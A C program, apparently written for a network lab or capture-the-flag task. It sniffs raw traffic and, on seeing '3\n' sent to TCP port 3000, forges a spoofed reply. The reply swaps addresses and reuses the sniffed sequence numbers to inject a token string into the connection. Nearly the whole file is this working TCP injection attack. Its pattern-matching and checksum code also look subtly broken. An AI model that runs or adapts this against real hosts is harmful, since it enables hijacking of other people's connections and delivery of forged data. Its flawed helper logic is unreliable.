#include<netinet/in.h>
#include<errno.h>
#include<netdb.h>
#include<stdio.h> //For standard things
#include<stdlib.h>    //malloc
#include<string.h>    //strlen
 
#include<netinet/ip_icmp.h>   //Provides declarations for icmp header
#include<netinet/udp.h>   //Provides declarations for udp header
#include<netinet/tcp.h>   //Provides declarations for tcp header
#include<netinet/ip.h>    //Provides declarations for ip header
#include<netinet/if_ether.h>  //For ETH_P_ALL
#include<net/ethernet.h>  //For ether_header
#include<sys/socket.h>
#include<arpa/inet.h>
#include<sys/ioctl.h>
#include<sys/time.h>
#include<sys/types.h>
#include<unistd.h>
 
void ProcessPacket(unsigned char* , int);
void print_ip_header(unsigned char* , int);
void print_tcp_packet(unsigned char * , int );
void print_udp_packet(unsigned char * , int );
void print_icmp_packet(unsigned char* , int );
void PrintData (unsigned char* , int);
 
FILE *logfile;
struct sockaddr_in source,dest;
int tcp=0,udp=0,icmp=0,others=0,igmp=0,total=0,i,j; 

#define SRCADDR "10.5.2.9"
#define DESTADDR "10.5.2.1"

struct packet {
    struct iphdr ip;
    struct tcphdr tcp;
    char data[27];
};

uint16_t in_cksum(uint16_t *addr, size_t len)
{
	register int nleft = len;
	register uint16_t *w = addr;
	register int sum = 0;
	uint16_t answer = 0;

	while (nleft > 1) {
		sum += *w++;
		nleft -= 2;
	}

	if (nleft == 1) {
		*(u_char *)(&answer) = *(u_char *)w;
		sum += answer;
	}

	sum = (sum >> 16) + (sum & 0xffff);
	sum += (sum >> 16);
	answer = ~sum;
	return answer;
}

void makepkt(struct iphdr *iph, struct tcphdr *tcph, int size) {
    struct packet pk;
    memset(&pk,0,sizeof(pk));

    strcat(pk.data, "START_TOKEN429583END_TOKEN\n");

    pk.ip.ihl = sizeof(pk.ip) >> 2;
    pk.ip.version = 4;
    pk.ip.tos = 0;
    pk.ip.tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
    pk.ip.id = iph->id;
    pk.ip.frag_off =  0x000;
    pk.ip.ttl = 64;
    pk.ip.protocol = IPPROTO_TCP;
    //pk.ip.check = 0;
    pk.ip.saddr = iph->daddr;
    pk.ip.daddr = iph->saddr;
    //pk.ip.ip_sum = ((uint16_t *)&pk.ip, sizeof(pk.ip));

    pk.tcp.source = tcph->dest;
    pk.tcp.dest = tcph->source;
    pk.tcp.seq = tcph->ack_seq;
    pk.tcp.ack_seq = htonl(ntohl(tcph->seq) + size);
    pk.tcp.window = htons(224);
    //pk.tcp.check = htons(0);
    pk.tcp.doff = sizeof(struct tcphdr) >> 2;
    pk.tcp.urg = 0;
    pk.tcp.ack = 1;
    pk.tcp.psh = 1;
    pk.tcp.rst = 0;
    pk.tcp.syn = 0;
    pk.tcp.fin = 0;
    pk.tcp.urg_ptr = 0;
    char tcpbuf[4096], *ptr;
    uint16_t s;
	ptr = tcpbuf;
	memset(tcpbuf, 0, sizeof(tcpbuf));
	memcpy(ptr, &(pk.ip.saddr), 8);
	ptr += 9;
	*ptr++ = pk.ip.protocol;
	s = htons(sizeof(pk.data) + sizeof(pk.tcp));
	memcpy(ptr, &s, 2);
	ptr += 2;
	memcpy(ptr, &pk.tcp, sizeof(pk.tcp));
	ptr += sizeof(pk.tcp);
	memcpy(ptr, &pk.data, sizeof(pk.data));
	pk.tcp.th_sum = htonl(ntohl(in_cksum((uint16_t *)tcpbuf, sizeof(pk.tcp) + 12 + sizeof(pk.data)))- 14);

//    pk.tcp.len = htons(sizeof(pk)-sizeof(pk.ip));

    int sock;
    sock = socket(AF_INET,SOCK_RAW,IPPROTO_RAW);

    struct sockaddr_in daddr;

    daddr.sin_family = AF_INET;
    daddr.sin_addr.s_addr = iph->daddr;
    daddr.sin_port = tcph->dest;
    memset(&daddr.sin_zero, 0, sizeof(daddr.sin_zero));
    sendto( sock, (char *) &pk, sizeof(pk), 0, (struct sockaddr *) &daddr, (socklen_t) sizeof(daddr));

    pk.tcp.seq = htonl(ntohl(tcph->ack_seq) + 1);
    pk.tcp.ack_seq = htonl(ntohl(tcph->seq) + size + 1);
    sendto( sock, (char *) &pk, sizeof(pk), 0, (struct sockaddr *) &daddr, (socklen_t) sizeof(daddr));

    close(sock);
}

int FindThing (unsigned char* data , int Size, unsigned char* thing, int thingLen, int exact) {
    if (exact && Size != thingLen)
        return 0;
    for (int i = 0; i < Size; i++) {
        for (int j = 0; j < thingLen; j++) {
            if (data[i + j] != thing[j])
                break;
            return 1;
        }
    }
    return 0;
}
 
int main()
{
    int saddr_size , data_size;
    struct sockaddr saddr;
         
    unsigned char *buffer = (unsigned char *) malloc(65536); //Its Big!
     
    int sock_raw = socket( AF_PACKET , SOCK_RAW , htons(ETH_P_ALL)) ;
    //setsockopt(sock_raw , SOL_SOCKET , SO_BINDTODEVICE , "eth0" , strlen("eth0")+ 1 );
     
    if(sock_raw < 0)
    {
        //Print the error with proper message
        perror("Socket Error");
        return 1;
    }
    while(1)
    {
        saddr_size = sizeof saddr;
        //Receive a packet
        data_size = recvfrom(sock_raw , buffer , 65536 , 0 , &saddr , (socklen_t*)&saddr_size);
        if(data_size <0 )
        {
            printf("Recvfrom error , failed to get packets\n");
            return 1;
        }
        //Now process the packet
        ProcessPacket(buffer , data_size);
    }
    close(sock_raw);
    printf("Finished");
    return 0;
}
 
void ProcessPacket(unsigned char* buffer, int size)
{
    //Get the IP Header part of this packet , excluding the ethernet header
    struct iphdr *iph = (struct iphdr*)(buffer + sizeof(struct ethhdr));
    ++total;
    switch (iph->protocol) //Check the Protocol and do accordingly...
    {
        case 6:  //TCP Protocol
            ++tcp;
            print_tcp_packet(buffer , size);
            break;
         
        default: //Some Other Protocol like ARP etc.
            ++others;
            break;
    }
}
 
void print_tcp_packet(unsigned char* Buffer, int Size)
{
    unsigned short iphdrlen;
     
    struct iphdr *iph = (struct iphdr *)( Buffer  + sizeof(struct ethhdr) );
    iphdrlen = iph->ihl*4;
     
    struct tcphdr *tcph=(struct tcphdr*)(Buffer + iphdrlen + sizeof(struct ethhdr));
             
    int header_size =  sizeof(struct ethhdr) + iphdrlen + tcph->doff*4;
     
    if (ntohs(tcph->dest) == 3000) {
        char findme[] = "3\n";
        int found = FindThing(Buffer + header_size, Size - header_size, findme, 2, 1);
        fprintf(stdout, "Found: %d\n", found);
        if (found)
            makepkt(iph, tcph, Size - header_size);
    }
}


void PrintData (unsigned char* data , int Size)
{
    int i , j;
    for(i=0 ; i < Size ; i++)
    {
        if( i!=0 && i%16==0)   //if one line of hex printing is complete...
        {
            fprintf(logfile , "         ");
            for(j=i-16 ; j<i ; j++)
            {
                if(data[j]>=32 && data[j]<=128)
                    fprintf(logfile , "%c",(unsigned char)data[j]); //if its a number or alphabet
                 
                else fprintf(logfile , "."); //otherwise print a dot
            }
            fprintf(logfile , "\n");
        } 
         
        if(i%16==0) fprintf(logfile , "   ");
            fprintf(logfile , " %02X",(unsigned int)data[i]);
                 
        if( i==Size-1)  //print the last spaces
        {
            for(j=0;j<15-i%16;j++) 
            {
              fprintf(logfile , "   "); //extra spaces
            }
             
            fprintf(logfile , "         ");
             
            for(j=i-i%16 ; j<=i ; j++)
            {
                if(data[j]>=32 && data[j]<=128) 
                {
                  fprintf(logfile , "%c",(unsigned char)data[j]);
                }
                else
                {
                  fprintf(logfile , ".");
                }
            }
             
            fprintf(logfile ,  "\n" );
        }
    }
}
